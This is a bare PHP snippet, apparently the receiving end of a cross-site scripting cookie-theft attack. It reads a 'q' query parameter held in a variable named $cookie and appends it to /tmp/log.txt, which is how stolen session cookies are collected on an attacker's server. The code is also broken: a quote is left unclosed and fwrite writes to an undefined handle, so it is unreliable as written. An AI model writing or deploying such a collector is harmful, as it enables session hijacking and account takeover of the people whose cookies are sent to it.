<?php
$filename="/tmp/log.txt";
$fp=fopen($filename,'a');
$cookie=$_GET['q];
fwrite($f,$cookie);
fclose($fp);
?>
